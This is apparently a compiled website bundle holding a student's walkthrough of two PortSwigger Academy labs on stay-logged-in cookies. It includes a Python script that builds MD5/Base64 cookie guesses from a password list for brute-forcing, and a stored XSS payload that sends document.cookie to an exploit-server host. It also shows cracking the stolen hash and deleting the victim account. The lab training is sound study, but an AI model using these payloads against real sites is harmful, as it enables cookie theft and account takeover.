"use strict";(self.webpackChunkcybersec_notes=self.webpackChunkcybersec_notes||[]).push([[1793],{3905:function(e,t,n){n.d(t,{Zo:function(){return p},kt:function(){return h}});var o=n(7294);function i(e,t,n){return t in e?Object.defineProperty(e,t,{value:n,enumerable:!0,configurable:!0,writable:!0}):e[t]=n,e}function a(e,t){var n=Object.keys(e);if(Object.getOwnPropertySymbols){var o=Object.getOwnPropertySymbols(e);t&&(o=o.filter((function(t){return Object.getOwnPropertyDescriptor(e,t).enumerable}))),n.push.apply(n,o)}return n}function s(e){for(var t=1;t<arguments.length;t++){var n=null!=arguments[t]?arguments[t]:{};t%2?a(Object(n),!0).forEach((function(t){i(e,t,n[t])})):Object.getOwnPropertyDescriptors?Object.defineProperties(e,Object.getOwnPropertyDescriptors(n)):a(Object(n)).forEach((function(t){Object.defineProperty(e,t,Object.getOwnPropertyDescriptor(n,t))}))}return e}function r(e,t){if(null==e)return{};var n,o,i=function(e,t){if(null==e)return{};var n,o,i={},a=Object.keys(e);for(o=0;o<a.length;o++)n=a[o],t.indexOf(n)>=0||(i[n]=e[n]);return i}(e,t);if(Object.getOwnPropertySymbols){var a=Object.getOwnPropertySymbols(e);for(o=0;o<a.length;o++)n=a[o],t.indexOf(n)>=0||Object.prototype.propertyIsEnumerable.call(e,n)&&(i[n]=e[n])}return i}var c=o.createContext({}),l=function(e){var t=o.useContext(c),n=t;return e&&(n="function"==typeof e?e(t):s(s({},t),e)),n},p=function(e){var t=l(e.components);return o.createElement(c.Provider,{value:t},e.children)},d={inlineCode:"code",wrapper:function(e){var t=e.children;return o.createElement(o.Fragment,{},t)}},u=o.forwardRef((function(e,t){var n=e.components,i=e.mdxType,a=e.originalType,c=e.parentName,p=r(e,["components","mdxType","originalType","parentName"]),u=l(n),h=i,g=u["".concat(c,".").concat(h)]||u[h]||d[h]||a;return n?o.createElement(g,s(s({ref:t},p),{},{components:n})):o.createElement(g,s({ref:t},p))}));function h(e,t){var n=arguments,i=t&&t.mdxType;if("string"==typeof e||i){var a=n.length,s=new Array(a);s[0]=u;var r={};for(var c in t)hasOwnProperty.call(t,c)&&(r[c]=t[c]);r.originalType=e,r.mdxType="string"==typeof e?e:i,s[1]=r;for(var l=2;l<a;l++)s[l]=n[l];return o.createElement.apply(null,s)}return o.createElement.apply(null,n)}u.displayName="MDXCreateElement"},8860:function(e,t,n){n.r(t),n.d(t,{frontMatter:function(){return r},contentTitle:function(){return c},metadata:function(){return l},toc:function(){return p},default:function(){return u}});var o=n(7462),i=n(3366),a=(n(7294),n(3905)),s=["components"],r={},c=void 0,l={unversionedId:"portswigger/Authentication/Stay-logged-in-cookie",id:"portswigger/Authentication/Stay-logged-in-cookie",title:"Stay-logged-in-cookie",description:"Keeping users logged in",source:"@site/docs/portswigger/Authentication/Stay-logged-in-cookie.md",sourceDirName:"portswigger/Authentication",slug:"/portswigger/Authentication/Stay-logged-in-cookie",permalink:"/Cybernotes/docs/portswigger/Authentication/Stay-logged-in-cookie",tags:[],version:"current",frontMatter:{},sidebar:"tutorialSidebar",previous:{title:"Password-reset-poisoning",permalink:"/Cybernotes/docs/portswigger/Authentication/Password-reset-poisoning"},next:{title:"User rate limiting",permalink:"/Cybernotes/docs/portswigger/Authentication/user-rate-limiting"}},p=[{value:"Keeping users logged in",id:"keeping-users-logged-in",children:[],level:2},{value:"Lab: Brute-forcing a stay-logged-in cookie",id:"lab-brute-forcing-a-stay-logged-in-cookie",children:[],level:2}],d={toc:p};function u(e){var t=e.components,r=(0,i.Z)(e,s);return(0,a.kt)("wrapper",(0,o.Z)({},d,r,{components:t,mdxType:"MDXLayout"}),(0,a.kt)("h2",{id:"keeping-users-logged-in"},"Keeping users logged in"),(0,a.kt)("p",null,'A common feature is the option to stay logged in even after closing a browser session. This is usually a simple checkbox labeled something like "Remember me" or "Keep me logged in".'),(0,a.kt)("p",null,'This functionality is often implemented by generating a "remember me" token of some kind, which is then stored in a persistent cookie. As possessing this cookie effectively allows you to bypass the entire login process, it is best practice for this cookie to be impractical to guess. However, some websites generate this cookie based on a predictable concatenation of static values, such as the username and a timestamp. Some even use the password as part of the cookie. This approach is particularly dangerous if an attacker is able to create their own account because they can study their own cookie and potentially deduce how it is generated. Once they work out the formula, they can try to brute-force other users\' cookies to gain access to their accounts.'),(0,a.kt)("p",null,'Some websites assume that if the cookie is encrypted in some way it will not be guessable even if it does use static values. While this may be true if done correctly, naively "encrypting" the cookie using a simple two-way encoding like Base64 offers no protection whatsoever. Even using proper encryption with a one-way hash function is not completely bulletproof. If the attacker is able to easily identify the hashing algorithm, and no salt is used, they can potentially brute-force the cookie by simply hashing their wordlists. This method can be used to bypass login attempt limits if a similar limit isn\'t applied to cookie guesses.'),(0,a.kt)("h2",{id:"lab-brute-forcing-a-stay-logged-in-cookie"},"Lab: Brute-forcing a stay-logged-in cookie"),(0,a.kt)("p",null,"--\x3e This website is storing the password in the ",(0,a.kt)("inlineCode",{parentName:"p"},"stay-logged-in")," cookie in the encrypted form."),(0,a.kt)("p",null,"So we have to pass this request to intruder and then brute force the ",(0,a.kt)("inlineCode",{parentName:"p"},"stay-logged-in")," cookie for ",(0,a.kt)("inlineCode",{parentName:"p"},"carlos")," user"),(0,a.kt)("p",null,(0,a.kt)("img",{src:n(9687).Z,width:"1467",height:"579"})),(0,a.kt)("p",null,"--\x3e but first we have to logout because it will redirect us to this page only if we are logged in without checking the cookie."),(0,a.kt)("p",null,"And to encrypt the passwords according to cookie logic i made one python script:"),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre",className:"language-py"},'import hashlib\nimport base64\n\npasswords = ["123456","password","12345678","qwerty","123456789","12345","1234","111111","1234567","dragon","123123","baseball","abc123","football","monkey","letmein","shadow","master","666666","qwertyuiop","123321","mustang","1234567890","michael","654321","superman","1qaz2wsx","7777777","121212","000000","qazwsx","123qwe","killer","trustno1","jordan","jennifer","zxcvbnm","asdfgh","hunter","buster","soccer","harley","batman","andrew","tigger","sunshine","iloveyou","2000","charlie","robert","thomas","hockey","ranger","daniel","starwars","klaster","112233","george","computer","michelle","jessica","pepper","1111","zxcvbn","555555","11111111","131313","freedom","777777","pass","maggie","159753","aaaaaa","ginger","princess","joshua","cheese","amanda","summer","love","ashley","nicole","chelsea","biteme","matthew","access","yankees","987654321","dallas","austin","thunder","taylor","matrix","mobilemail","mom","monitor","monitoring","montana","moon","moscow"]\n\nconverted = []\nfor password in passwords:\n    hash_object = hashlib.md5(password.encode())\n    md5_hash = hash_object.hexdigest()\n    md5_hash = str(md5_hash)\n    myCookie = "carlos:"\n    myCookie += md5_hash\n    convert_b64_bytes = myCookie.encode(\'ascii\')\n    base64_bytes = base64.b64encode(convert_b64_bytes)\n    base64_string = base64_bytes.decode("ascii")\n    base64_string = str(base64_string)\n\n    converted.append(base64_string)\n\nfor word in converted:\n    print(word)\n\n\n\n# sample_string = "GeeksForGeeks is the best"\n# sample_string_bytes = sample_string.encode("ascii")\n\n# base64_bytes = base64.b64encode(sample_string_bytes)\n# base64_string = base64_bytes.decode("ascii")\n')),(0,a.kt)("p",null,"--\x3e After running the python file i got all the encoded_cookies so now just we have to brute force them!"),(0,a.kt)("p",null,"And after some time i found the correct cookie which gave us ",(0,a.kt)("inlineCode",{parentName:"p"},"200")," status code!"),(0,a.kt)("p",null,(0,a.kt)("img",{src:n(7746).Z,width:"1327",height:"897"})),(0,a.kt)("p",null,"And we solved the lab!"),(0,a.kt)("p",null,(0,a.kt)("img",{src:n(485).Z,width:"1465",height:"521"})),(0,a.kt)("hr",null),(0,a.kt)("p",null,"Even if the attacker is not able to create their own account, they may still be able to exploit this vulnerability. Using the usual techniques, such as ",(0,a.kt)("a",{parentName:"p",href:"https://portswigger.net/web-security/cross-site-scripting"},"XSS"),', an attacker could steal another user\'s "remember me" cookie and deduce how the cookie is constructed from that. If the website was built using an open-source framework, the key details of the cookie construction may even be publicly documented.'),(0,a.kt)("p",null,"In some rare cases, it may be possible to obtain a user's actual password in cleartext from a cookie, even if it is hashed. Hashed versions of well-known password lists are available online, so if the user's password appears in one of these lists, decrypting the hash can occasionally be as trivial as just pasting the hash into a search engine. This demonstrates the importance of salt in effective encryption."),(0,a.kt)("h1",{id:"lab-offline-password-cracking"},"Lab: Offline password cracking"),(0,a.kt)("p",null,"This lab stores the user's password hash in a cookie. The lab also contains an XSS vulnerability in the comment functionality. To solve the lab, obtain Carlos's ",(0,a.kt)("inlineCode",{parentName:"p"},"stay-logged-in")," cookie and use it to crack his password. Then, log in as ",(0,a.kt)("inlineCode",{parentName:"p"},"carlos"),' and delete his account from the "My account" page.'),(0,a.kt)("ul",null,(0,a.kt)("li",{parentName:"ul"},"Your credentials: ",(0,a.kt)("inlineCode",{parentName:"li"},"wiener:peter")),(0,a.kt)("li",{parentName:"ul"},"Victim's username: ",(0,a.kt)("inlineCode",{parentName:"li"},"carlos"))),(0,a.kt)("p",null,"--\x3e So first i logged in as ",(0,a.kt)("inlineCode",{parentName:"p"},"wiener")," and then i found that we can comment on any post so i opened one post and commented the stored XSS payload :"),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre",className:"language-markup"},"<script>document.location='//exploit-acc81fe51e0eddf3c0598bf601660076.web-security-academy.net/'+document.cookie<\/script>\n")),(0,a.kt)("p",null,(0,a.kt)("img",{src:n(8878).Z,width:"917",height:"743"})),(0,a.kt)("p",null,"--\x3e After posting the comment i went to ",(0,a.kt)("inlineCode",{parentName:"p"},"exploit server")," and then went to ",(0,a.kt)("inlineCode",{parentName:"p"},"access logs")," and found the cookie of ",(0,a.kt)("inlineCode",{parentName:"p"},"carlos")),(0,a.kt)("p",null,(0,a.kt)("img",{src:n(8778).Z,width:"1905",height:"227"})),(0,a.kt)("p",null,"--\x3e After decoding the cookie from ",(0,a.kt)("inlineCode",{parentName:"p"},"base64")," and ",(0,a.kt)("inlineCode",{parentName:"p"},"md5")," i found the password as ",(0,a.kt)("inlineCode",{parentName:"p"},"onceuponatime")," and i logged in as ",(0,a.kt)("inlineCode",{parentName:"p"},"carlos")," and now we have to delete the account of carlos so click on delete account"),(0,a.kt)("p",null,(0,a.kt)("img",{src:n(3700).Z,width:"1295",height:"585"})),(0,a.kt)("p",null,"--\x3e It will ask for password, click ",(0,a.kt)("inlineCode",{parentName:"p"},"delete account!")),(0,a.kt)("p",null,(0,a.kt)("img",{src:n(3962).Z,width:"581",height:"329"})),(0,a.kt)("p",null,"And we solved the lab!"))}u.isMDXComponent=!0},485:function(e,t,n){t.Z=n.p+"assets/images/Pastedimage20220204130542-4c28763cb97323a454c75acc6e760223.png"},9687:function(e,t,n){t.Z=n.p+"assets/images/Pastedimage20220204131145-358cba4982ac3dc3f616e645f98b43c8.png"},7746:function(e,t,n){t.Z=n.p+"assets/images/Pastedimage20220204131645-37027862e00872f12231488e9c0c63b1.png"},3700:function(e,t,n){t.Z=n.p+"assets/images/Pastedimage20220204134737-91b35dd9cd41846a8bf283536f98c259.png"},3962:function(e,t,n){t.Z=n.p+"assets/images/Pastedimage20220204134800-84d96ab9a67e4cd57c6ad6440c850ddd.png"},8878:function(e,t,n){t.Z=n.p+"assets/images/Pastedimage20220204143051-c032787136ac83c8dd89ff2bc242d7c0.png"},8778:function(e,t,n){t.Z=n.p+"assets/images/Pastedimage20220204143159-25bb5ea169fdf0ef1677dfbeaff2a4eb.png"}}]);